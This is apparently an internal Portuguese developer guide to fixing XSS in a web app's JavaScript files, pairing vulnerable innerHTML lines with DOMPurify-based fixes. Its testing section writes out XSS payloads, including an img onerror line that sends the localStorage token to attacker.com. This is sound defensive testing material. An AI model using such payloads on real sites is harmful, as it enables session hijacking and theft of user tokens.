# 🛡️ Guia Rápido de Proteção XSS
**Status:** 🟡 Parcialmente Implementado
**Última Atualização:** 18/01/2025

---

## ✅ O QUE JÁ FOI FEITO

1. ✅ DOMPurify 3.0.6 instalado via CDN
2. ✅ `sanitize.js` helper criado
3. ✅ Disponível em: dashboard, conceituacao, diagnostic, desafios

---

## 🔧 COMO USAR

### Opção 1: safeSetInnerHTML() [RECOMENDADO]
```javascript
// ❌ ANTES (VULNERÁVEL)
element.innerHTML = data.feedback;

// ✅ DEPOIS (SEGURO)
safeSetInnerHTML(element, data.feedback);
```

### Opção 2: sanitizeHTML() Manual
```javascript
// ✅ SEGURO
const clean = sanitizeHTML(data.feedback);
element.innerHTML = clean;
```

### Opção 3: escapeHTML() (Texto puro)
```javascript
// ✅ SEGURO - Remove TODO HTML
const safe = escapeHTML(userInput);
element.textContent = safe; // ou
element.innerHTML = safe;
```

---

## 🎯 PRIORIDADE DE CORREÇÃO

### 🔴 CRÍTICO (Dados de usuários/backend)

#### 1. conceituacao.js - Linha ~503
```javascript
// ❌ VULNERÁVEL
document.getElementById('feedbackContainer').innerHTML = feedbackHTML;

// ✅ CORREÇÃO
const container = document.getElementById('feedbackContainer');
safeSetInnerHTML(container, feedbackHTML);
```

#### 2. conceituacao.js - Linha ~322 (Vinheta)
```javascript
// ❌ VULNERÁVEL
document.getElementById('caseContainer').innerHTML = `
    <div class="vignette">${vignette}</div>
`;

// ✅ CORREÇÃO
const safeVignette = sanitizeHTML(vignette);
document.getElementById('caseContainer').innerHTML = `
    <div class="vignette">${safeVignette}</div>
`;
```

#### 3. diagnostic.js - Linha ~193 (Caso clínico)
```javascript
// ❌ VULNERÁVEL
container.innerHTML = `
    <div class="vignette">${caseData.vignette}</div>
`;

// ✅ CORREÇÃO
const safeVignette = sanitizeHTML(caseData.vignette);
container.innerHTML = `
    <div class="vignette">${safeVignette}</div>
`;
```

#### 4. diagnostic.js - Linha ~293 (Feedback)
```javascript
// ❌ VULNERÁVEL
feedbackContainer.innerHTML = `
    <p>${data.feedback.rationale}</p>
`;

// ✅ CORREÇÃO
const safeRationale = sanitizeHTML(data.feedback.rationale);
feedbackContainer.innerHTML = `
    <p>${safeRationale}</p>
`;
```

#### 5. desafios.js - Linha ~194 (Vinheta momento crítico)
```javascript
// ❌ VULNERÁVEL
document.getElementById('momentContainer').innerHTML = `
    <div class="vignette">${vinheta}</div>
`;

// ✅ CORREÇÃO
const safeVinheta = sanitizeHTML(vinheta);
document.getElementById('momentContainer').innerHTML = `
    <div class="vignette">${safeVinheta}</div>
`;
```

---

### 🟡 MÉDIO (UI dinâmica)

#### 6. dashboard.js - Linha ~715 (Missions)
```javascript
// 🟡 MÉDIO RISCO (dados do próprio backend)
grid.innerHTML = missions.map(mission => `...`).join('');

// ✅ MELHOR
const missionHTML = missions.map(mission => {
    const title = escapeHTML(mission.title);
    const description = escapeHTML(mission.description);
    return `<div><h3>${title}</h3><p>${description}</p></div>`;
}).join('');
grid.innerHTML = missionHTML;
```

#### 7. dashboard.js - Linha ~792 (Badges)
```javascript
// Similar à correção de missions
```

---

### 🟢 BAIXO (Dados estáticos/controlados)

#### 8. dashboard.js - Linha ~890 (Floating cognits)
```javascript
// 🟢 BAIXO RISCO (apenas números)
floater.innerHTML = `+${amount} <span class="cognit-emoji">💎</span>`;
// OK manter assim se 'amount' é sempre número
```

#### 9. gamification.js - Linha ~20 (Toast)
```javascript
// 🟢 BAIXO RISCO (valores controlados)
toast.innerHTML = `...`;
// OK se não usa dados de usuário
```

---

## 📋 CHECKLIST DE IMPLEMENTAÇÃO

### Conceituacao.js
- [ ] Linha ~121: panel.innerHTML (progresso)
- [ ] Linha ~322: vignette (CRÍTICO)
- [ ] Linha ~503: feedbackHTML (CRÍTICO)

### Diagnostic.js
- [ ] Linha ~119: panel.innerHTML (progresso)
- [ ] Linha ~193: vignette (CRÍTICO)
- [ ] Linha ~293: feedback (CRÍTICO)

### Desafios.js
- [ ] Linha ~140: panel.innerHTML (progresso)
- [ ] Linha ~194: vinheta (CRÍTICO)
- [ ] Linha ~305: feedback (CRÍTICO)

### Dashboard.js
- [ ] Linha ~715: missions (médio)
- [ ] Linha ~792: badges (médio)
- [ ] Linha ~890: floatingCognits (baixo)

---

## 🧪 COMO TESTAR XSS

### Teste 1: Injeção de Script
```javascript
// Em campo de input ou simulando resposta do backend
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
```

**Resultado Esperado:**
- ❌ ANTES: Alert aparece (XSS executou)
- ✅ DEPOIS: Script é escapado, aparece como texto

### Teste 2: Roubo de Token
```javascript
<img src=x onerror="fetch('https://attacker.com?token='+localStorage.getItem('token'))">
```

**Resultado Esperado:**
- ✅ Script bloqueado, token não enviado

---

## 📊 PROGRESSO

| Arquivo | Total innerHTML | Corrigidos | % |
|---------|-----------------|------------|---|
| conceituacao.js | 9 | 0 | 0% |
| diagnostic.js | 8 | 0 | 0% |
| desafios.js | 24 | 0 | 0% |
| dashboard.js | 11 | 0 | 0% |
| gamification.js | 2 | 0 | 0% |
| chat.js | 7 | 0 | 0% |

**TOTAL:** 0/61 (0%)

**Meta para Deploy:** 100% dos CRÍTICOS corrigidos (mínimo 15/61)

---

## 🚀 DEPLOY CHECKLIST

Antes de fazer deploy, verificar:
- [ ] Todos innerHTML CRÍTICOS sanitizados (🔴)
- [ ] Testes XSS realizados
- [ ] Nenhum alert() aparecer com payloads XSS
- [ ] Tokens não podem ser roubados
- [ ] Feedback do backend exibido corretamente

---

## 💡 BOAS PRÁTICAS

### DO ✅
```javascript
// Use safeSetInnerHTML para dados não confiáveis
safeSetInnerHTML(element, backendData);

// Escape texto dentro de template literals
const safe = escapeHTML(userInput);
element.innerHTML = `<p>${safe}</p>`;

// Use textContent para texto puro
element.textContent = userInput; // Sem HTML
```

### DON'T ❌
```javascript
// Nunca confie em dados do backend sem sanitizar
element.innerHTML = backendData; // ❌

// Nunca interpole diretamente em innerHTML
element.innerHTML = `<div>${userData}</div>`; // ❌

// Nunca use eval ou Function constructor
eval(backendCode); // ❌❌❌
```

---

**Última Revisão:** 18/01/2025
**Responsável:** Dev Team
**Status:** 🟡 Em Implementação
